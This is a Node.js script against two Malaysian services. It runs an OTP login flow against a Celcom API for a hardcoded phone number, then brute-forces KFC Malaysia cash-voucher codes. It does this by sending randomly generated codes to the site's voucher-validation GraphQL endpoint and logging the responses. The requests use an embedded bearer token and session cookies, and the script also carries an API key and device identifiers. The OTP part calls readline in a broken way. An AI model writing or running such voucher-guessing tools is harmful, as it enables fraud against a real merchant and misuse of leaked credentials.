const fetch=require("node-fetch");
const fs=require("fs");
const readline = require('readline');
function askQuestion(query) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }))
}




const cHost="https://apicl3.celcom.com.my";

let msisdn="0138321592";

async function secureToken(token){
	let url="https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyCustomToken?key=AIzaSyAY_xgPxtljMmsFPn8NFDyN7S-eeqzI4Io";
	let postBody={"token":token,"returnSecureToken":true};
	let postHead={"content-type":"application/json"};
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let res=await fetch(url,postSet);
        let resJson=await res.json();
       
	console.log("TOKEN IS :\n"+resJson.idToken);
        fs.appendFileSync("token.txt","secure token=======\n"+resJson.idToken+"\n");
	return resJson.idToken;
}

async function otpVal(num,otp,sId){
	let path="/auth/token-create";
	let postBody={"otp":otp,"type":"msisdn","sessionId":sId,"loginChannel":"otp","pushToken":"","networkType":"cellular","adId":"e12d7a5f-adf8-4f4b-8964-e8fa51e1a8c3","appVersion":"3.0.67","deviceModel":"CPH2387","deviceVersion":"14","deviceId":"889fa5074a7ab067","os":"android","referralCode":"","networkSpeed":"5"};
	let postHead={"content-type":"application/json"};
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let url=cHost+path;
	let res=await fetch(url,postSet);
	let resJson=await res.json();
	let token=resJson.token;
        fs.writeFileSync("token.txt","token======\n"+token+"\n");
	return secureToken(token);
}

async function otpGen(num){
	let path="/auth/otp-generate";
	let postBody={"msisdn":"6"+num};
        let postHead={"content-type":"application/json"};
        let url=cHost+path;
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let res=await fetch(url,postSet);
	let resJson=await res.json();
        console.log(resJson);
	let sId=resJson.sessionId;
        console.log("Session id: "+sId);
	readline.question("Done requesting otp,enter below\n",e=>{
		return otpVal(num,e,sId);
		readline.close();
	});
}

async function testCp(c){
	let cpl=11;
	let ocp="EAPRU";
	let rcp=cpl-ocp.length;
	let cp=ocp;
	fs.writeFileSync("cpres.txt","");
	
	let anum="QWERTYUIOPALSKDJFHGBCNZMXVAHUEO37192645809856891238046145HFKEOQNXVVLS";
	for(let i=0;i<c;++i){
		cp=ocp;
		for(let j=0;j<rcp;++j){
			let ind=Math.floor(Math.random()*anum.length);
			cp+=anum[ind];
		}
//		cp="YAPRUD1T0M4";
		let url="https://kfc.com.my/graphql?query=query+cashVoucherValidate%28%24cart_id%3AString%21%24couponCode%3AString%21%29%7BcashVoucherValidate%28couponCode%3A%24couponCode+cart_id%3A%24cart_id%29%7BvoucherCode+responseCode+message+refId+value+valid+isCaptchaValid+__typename%7D%7D&operationName=cashVoucherValidate&variables=%7B%22cart_id%22%3A%22EDoQ5imrSDUCrHZCBA2OFMN9qR3CEp9z%22%2C%22couponCode%22%3A%22$"+cp+"%22%7D";
	
	let res=await fetch(url, {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-MY,en;q=0.9,ms-MY;q=0.8,ms;q=0.7,en-GB;q=0.6,en-US;q=0.5",
    "authorization": "Bearer eyJraWQiOiIxIiwiYWxnIjoiSFMyNTYifQ.eyJ1aWQiOjE1OTk2NjMsInV0eXBpZCI6MywiaWF0IjoxNzM2NDMwNzE4LCJleHAiOjE3MzkwMjI3MTh9.C2EtfqVQozU4xuxDI4nn-t6lpOpHsULkXRZAE8bD-34",
    "cookie": "PHPSESSID=05935b0aa5956cd794c6e08d35536de7; _gcl_au=1.1.2065640772.1736430648; _fbp=fb.2.1736430648495.402957047202271766; _tt_enable_cookie=1; _ttp=_k-pMSsjrp2pb-l6vqp6rLearh5.tt.2; _clck=qw8khm%7C2%7Cfsf%7C0%7C1835; authentication_flag=true; dataservices_customer_id=%221599663%22; dataservices_customer_group=%7B%22customerGroupCode%22%3A%22356a192b7913b04c54574d18c28d46e6395428ab%22%7D; _gid=GA1.3.870078714.1736430722; private_content_version=0d4dfad07a0afb12b32350ebe3b37565; aePageCount=4; _clsk=2k9ufc%7C1736431008204%7C2%7C1%7Ct.clarity.ms%2Fcollect; _ga=GA1.3.76406936.1736430645; _gat_UA-50820363-1=1; _ga_25MP79ST71=GS1.1.1736430645.1.1.1736431048.30.0.1973312397; _td=eb01d142-0b35-4c5b-9d4f-f9727e242c53",
    "Referer": "https://kfc.com.my/cart",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});
let resText= await res.text();
let txt=i+" | cp :"+cp+"\n"+resText;
console.log(txt)
console.log("++++++++++");
fs.appendFileSync("cpres.txt",txt+"\n++++++++++\n");
}
}

let gc=1;

if(process.argv.length>2)gc=process.argv[2];
//fs.writeFileSync("token.txt",otpGen(msisdn));
//otpGen(msisdn);
testCp(gc);
